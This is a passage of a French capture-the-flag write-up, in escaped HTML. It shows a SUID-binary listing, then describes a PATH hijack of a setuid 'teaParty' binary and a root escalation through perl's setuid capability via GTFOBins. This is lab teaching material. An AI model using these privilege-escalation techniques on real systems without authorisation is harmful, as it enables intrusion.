&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;rwsr&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;xr&lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root messagebus &lt;span style=&#34;color:#ae81ff&#34;&gt;42992&lt;/span&gt; Jun &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2019&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;usr&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;lib&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;dbus&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1.0&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;dbus&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;daemon&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;launch&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;helper
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;rwsr&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;xr&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;x &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;14328&lt;/span&gt; Mar &lt;span style=&#34;color:#ae81ff&#34;&gt;27&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2019&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;usr&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;lib&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;policykit&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;polkit&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;agent&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;helper&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;rwsr&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;xr&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;x &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;436552&lt;/span&gt; Mar  &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2019&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;usr&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;lib&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;openssh&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;ssh&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;keysign
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;rwsr&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;xr&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;x &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;100760&lt;/span&gt; Nov &lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2018&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;usr&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;lib&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;x86_64&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;linux&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;gnu&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;lxc&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;lxc&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;user&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;nic
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;rwsr&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;xr&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;x &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;10232&lt;/span&gt; Mar &lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2017&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;usr&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;lib&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;eject&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;dmcrypt&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;get&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;device
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;rwsr&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;xr&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;x &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;44528&lt;/span&gt; Mar &lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2019&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;usr&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;bin&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;chsh
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;rwsr&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;xr&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;x &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;37136&lt;/span&gt; Mar &lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2019&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;usr&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;bin&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;newuidmap
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;rwsr&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;xr&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;x &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;18448&lt;/span&gt; Jun &lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2019&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;usr&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;bin&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;traceroute6&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;iputils
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;rwsr&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;xr&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;x &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;76496&lt;/span&gt; Mar &lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2019&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;usr&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;bin&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;chfn
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;rwsr&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;xr&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;x &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;59640&lt;/span&gt; Mar &lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2019&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;usr&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;bin&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;passwd
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;rwsr&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;xr&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;x &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;75824&lt;/span&gt; Mar &lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2019&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;usr&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;bin&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;gpasswd
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;rwsr&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;xr&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;x &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;40344&lt;/span&gt; Mar &lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2019&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;usr&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;bin&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;newgrp
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;rwsr&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;xr&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;x &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;37136&lt;/span&gt; Mar &lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2019&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;usr&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;bin&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;newgidmap
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;rwsr&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;xr&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;x &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;22520&lt;/span&gt; Mar &lt;span style=&#34;color:#ae81ff&#34;&gt;27&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2019&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;usr&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;bin&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;pkexec
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;rwsr&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;xr&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;x &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;149080&lt;/span&gt; Jan &lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2020&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;usr&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;bin&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;sudo
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;rwsr&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;xr&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;x &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;30800&lt;/span&gt; Aug &lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2016&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;bin&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;fusermount
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;rwsr&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;xr&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;x &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;26696&lt;/span&gt; Mar  &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2020&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;bin&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;umount
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;rwsr&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;xr&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;x &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;64424&lt;/span&gt; Jun &lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2019&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;bin&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;ping
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;rwsr&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;xr&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;x &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;43088&lt;/span&gt; Mar  &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2020&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;bin&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;mount
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;rwsr&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;xr&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;x &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;44664&lt;/span&gt; Mar &lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2019&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;bin&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;su
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Le seul potentiel vecteur ici est &lt;strong&gt;/home/rabbit/teaParty&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;On va donc tenter de l‚Äôutiliser, tout d‚Äôabord on regarde de quel type de fichier il s‚Äôagit&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/207729395-9ba0b639-f460-4a44-b29e-9ff8e14026c9.png&#34; alt=&#34;2022-12-14-191837_1885x119_scrot&#34;&gt;&lt;/p&gt;
&lt;p&gt;Rien d‚Äôalarmant, on le lance pour voir comement il agit&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/207729408-87c54566-e2ff-4935-9343-3c136aa53095.png&#34; alt=&#34;2022-12-14-193311_721x188_scrot&#34;&gt;&lt;/p&gt;
&lt;p&gt;Bon‚Ä¶ rien de vraiment int√©ressant‚Ä¶ on va tenter de lire le fichier&lt;/p&gt;
&lt;p&gt;&lt;code&gt;‚å®Ô∏è cat teaParty&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Le fichier est illisible mais on peut voir ceci dans les strings&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/207729443-7d7dba20-8766-4d4d-a430-039cf699b087.png&#34; alt=&#34;2022-12-14-193330_653x54_scrot&#34;&gt;&lt;/p&gt;
&lt;p&gt;Il utilise le binaire &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;date&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;, on va pouvoir exploiter √ßa par une &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;path hijacking&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;On va donc cr√©er un fichier &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;date&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt; dans &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;/tmp/,&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt; dans lequel on met /bin/bash, puis on le rend √©x√©cutable et on met √† jour la variable path&lt;/p&gt;
&lt;p&gt;On a plus qu‚Äô√† relancer le &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;teaParty&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;, et au moment o√π le binaire &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;date&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt; est appell√©, notre &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;/bin/bash&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt; devrait √™tre √©x√©cut√©&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/207729517-3a0c5f1b-b205-4118-8ab6-8d7df3d0f82d.png&#34; alt=&#34;2022-12-14-193418_541x185_scrot&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;privesc-hatter--root&#34;&gt;Privesc (hatter ‚Üí root)&lt;/h1&gt;
&lt;p&gt;On est maintenant &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;hatter&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;, on va aller regarder ce qu‚Äôil y a dans son home&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/207729538-6dc8928a-754e-46be-905a-bfc57f0355ab.png&#34; alt=&#34;2022-12-14-193734_789x467_scrot&#34;&gt;&lt;/p&gt;
&lt;p&gt;Bon, on a un fichier &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;password.txt&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt; dans lequel il y a un mot de passe, probablement celui de l‚Äôutilisateur &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;hatter&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;On peut deviner qu‚Äôon va donc avoir besoin de la commande sudo pour le prochain &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;lateral move&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;On peut aussi deviner que puisque le premier &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;lateral move&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt; passait par le &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;sudo -l&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;, et que le deuxi√®me passait par le &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;setuid bit&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;, le troisi√®me passera s√ªrement par des &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;capabilities&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/207729551-49171758-7335-4aff-bac8-b706df1f8265.png&#34; alt=&#34;2022-12-14-193813_597x171_scrot&#34;&gt;&lt;/p&gt;
&lt;p&gt;Et en listant les &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;capabilities&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;, on voit que le binaire &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;perl&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt; a la capabilit√© &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;setuid&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt; sur la machine&lt;/p&gt;
&lt;p&gt;En passant sur GTFOBins, on trouve ceci&lt;/p&gt;
&lt;p&gt;‚Üí &lt;a href=&#34;https://gtfobins.github.io/gtfobins/perl/#capabilities&#34;&gt;https://gtfobins.github.io/gtfobins/perl/#capabilities&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;L‚Äôexploit est assez straight forward, on a plus qu‚Äô√† le lancer et on devrait normalement √™tre root&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/207729568-f1c02ece-5426-400f-acdc-bd40082f7544.png&#34; alt=&#34;2022-12-14-194231_1888x1032_scrot&#34;&gt;&lt;/p&gt;
&lt;p&gt;Etant root, on peut maintenant cat les &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;deux flags&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;gg!&lt;/p&gt;
</content>
